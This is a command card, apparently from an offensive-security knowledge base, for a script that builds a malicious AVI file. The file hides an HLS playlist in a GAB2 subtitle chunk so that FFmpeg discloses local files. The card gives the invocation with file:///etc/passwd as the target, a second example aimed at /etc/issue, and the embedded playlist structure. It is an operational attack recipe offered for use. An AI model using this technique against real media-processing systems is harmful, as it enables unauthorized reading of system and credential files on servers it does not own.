---
id: cmd-gen-avi-001
data: 'python3 gen_avi.py file:///etc/passwd output.avi'
tags:
  - avi-generation
  - file-uri
type: command
output: 'Generated output.avi with embedded HLS playlist including the file:// URI'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.398Z'
verified: false
validated: true
submitted: true
---
# generate-avi-with-file-uri

## Command

```bash
python3 gen_avi.py file:///etc/passwd output.avi
```

## Description

Generates a malicious AVI file embedding an HLS playlist in GAB2 subtitles with specified file:// URI, enabling local file disclosure when processed by FFmpeg.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `file://<path>` | file:// URI of the target local file | Yes |
| `output.avi` | Output AVI filename | Yes |

## Examples

### Basic Usage

```bash
python3 gen_avi.py file:///etc/passwd output.avi
```

### Advanced Usage

For /etc/issue:

```bash
python3 gen_avi.py file:///etc/issue issue.avi
```

## Expected Output

Creates output.avi; internal structure includes #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:1.0 /some/txt/file.txt #EXTINF:1.0 file:///etc/passwd #EXT-X-ENDLIST in GAB2 chunk.

## Related

- [[commands/run-file-reading-server]]
- [[procedures/Execute-Local-File-Disclosure-via-AVI]]
